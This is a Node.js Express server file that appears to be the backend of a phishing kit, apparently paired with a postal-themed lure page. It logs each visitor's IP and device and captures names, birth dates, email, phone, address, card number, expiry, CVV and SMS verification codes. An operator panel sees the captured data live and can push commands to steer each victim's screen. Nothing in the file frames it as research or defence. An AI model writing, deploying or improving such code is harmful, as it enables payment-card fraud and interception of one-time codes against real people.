import express from "express";
import path from "path";
import { createServer } from "http";
import { Server } from "socket.io";
import { createServer as createViteServer } from "vite";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

async function startServer() {
  const app = express();
  const httpServer = createServer(app);
  const PORT = 3000;

  app.use(express.json());

  // Track visitors
  const visitors = new Map();

  // Mimic the api.php behavior on standard Express server so preview/local testing works perfectly
  app.all("/api.php", (req, res) => {
    const method = req.method;
    const now = Math.floor(Date.now() / 1000);

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (method === 'OPTIONS') {
      return res.sendStatus(200);
    }

    // Clean up offline visitors (no ping for 10 seconds)
    for (const [id, v] of visitors.entries()) {
      if (now - v.last_seen > 10) {
        visitors.delete(id);
      }
    }

    if (method === 'GET') {
      const allVisitors = Array.from(visitors.values());
      res.json(allVisitors);
    } else if (method === 'POST') {
      const { 
        action, id, command, screen, user, birthDay, birthMonth,
        email, phone, address, card, cardExp, cardCvv, smsCode
      } = req.body;

      if (action === 'ping') {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
        const userAgent = req.headers['user-agent'] || '';
        
        let device = 'PC';
        if (/mobile/i.test(userAgent)) device = 'Mobile';
        else if (/tablet/i.test(userAgent)) device = 'Tablet';
        else if (/ipad/i.test(userAgent)) device = 'Tablet';

        if (id) {
          if (!visitors.has(id)) {
            visitors.set(id, {
              id,
              ip,
              device,
              status: 'online',
              command: '',
              screen: screen || 'login-screen',
              user: user || '',
              birthDay: birthDay || '',
              birthMonth: birthMonth || '',
              email: email || '',
              phone: phone || '',
              address: address || '',
              card: card || '',
              cardExp: cardExp || '',
              cardCvv: cardCvv || '',
              smsCode: smsCode || '',
              last_seen: now
            });
          } else {
            const v = visitors.get(id);
            v.last_seen = now;
            v.status = 'online';
            v.screen = screen || 'login-screen';
            if (user !== undefined) v.user = user;
            if (birthDay !== undefined) v.birthDay = birthDay;
            if (birthMonth !== undefined) v.birthMonth = birthMonth;
            if (email !== undefined) v.email = email;
            if (phone !== undefined) v.phone = phone;
            if (address !== undefined) v.address = address;
            if (card !== undefined) v.card = card;
            if (cardExp !== undefined) v.cardExp = cardExp;
            if (cardCvv !== undefined) v.cardCvv = cardCvv;
            if (smsCode !== undefined) v.smsCode = smsCode;
          }
          res.json({ success: true, command: visitors.get(id).command });
        } else {
          res.json({ success: false, message: 'Missing ID' });
        }
      } else if (action === 'control') {
        if (id && visitors.has(id)) {
          const v = visitors.get(id);
          v.command = command;
          res.json({ success: true });
        } else {
          res.json({ success: false, message: 'Visitor not found' });
        }
      } else if (action === 'clear_command') {
        if (id && visitors.has(id)) {
          const v = visitors.get(id);
          v.command = '';
          res.json({ success: true });
        } else {
          res.json({ success: false, message: 'Visitor not found' });
        }
      } else if (action === 'clear') {
        visitors.clear();
        res.json({ success: true });
      } else {
        res.json({ success: false, message: 'Unknown action' });
      }
    }
  });

  // API route to get panel
  app.get("/panel", (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
  });

  // API route to get Posta page (Consolidated to index.html)
  app.get("/posta", (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });

  app.get("/posta.html", (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });

  // Vite middleware
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files from the root directory for production (where panel.html is)
    app.use(express.static(path.join(__dirname)));
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
